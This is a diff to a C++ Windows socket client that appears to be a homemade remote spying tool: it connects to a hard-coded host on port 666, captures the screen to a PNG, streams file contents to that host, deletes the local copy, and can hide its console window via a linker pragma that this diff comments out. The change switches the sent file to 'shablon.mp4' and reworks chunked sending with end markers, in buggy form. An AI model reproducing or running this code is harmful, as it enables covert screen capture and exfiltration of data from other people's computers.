@@ -10,7 +10,7 @@
 
 #define PORT 666
 #define SERVERADDR "192.168.1.69"
-#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
 
@@ -175,15 +175,38 @@ int main(int argc, char* argv[])
 			bitmap.Save(L"screen.png", &png);
 			DeleteObject(hBitmap);
 			FILE *in1;
-			fopen_s(&in1, "screen.png", "rb");
-			while (!feof(in1)) {
-				char bufer[1024] = "";
-				int b = fread(bufer, 1, sizeof(bufer), in1);
-				int size = ftell(in1);
-				if (b != 0) send(my_sock, bufer, b, 0);
+			fopen_s(&in1, "shablon.mp4", "rb");
+			const int buflen = 1024;
+			bool end = false;
+			bool end2 = false;
+			while (1) {
+				char bufer[buflen] = "";
+				if (!end) {
+					int b = fread(bufer, 1, sizeof(bufer), in1);
+					if (b < buflen - 2) {
+						cout << "b < buflen - 2\n";
+						bufer[buflen - 1] = '@';
+						bufer[buflen - 2] = '@';
+						bufer[buflen - 3] = '^';
+						end2 = true;
+					}
+					else if (b == (buflen - 2)) {
+						cout << "b == buflen - 2\nend-TRUE\n";
+						bufer[buflen - 1] = '\0';
+						end = true;
+					}
+					int size = ftell(in1);
+					if (b != 0) send(my_sock, bufer, buflen, 0);
+					if (end2) { cout << "edn2true"; break; }
+				}
+				else {
+					cout << "end-TRUE;";
+					bufer[buflen - 1] = '@';
+					bufer[buflen - 2] = '@';
+					send(my_sock, bufer, buflen, 0);
+					break;
+				}
 			}
-			Sleep(6000);
-			send(my_sock, "@@^", 3, 0);
 			fclose(in1);
 			remove("screen.png");
 			std::cout << MessageBox(NULL,"del", "System32", MB_OK | MB_ICONWARNING);
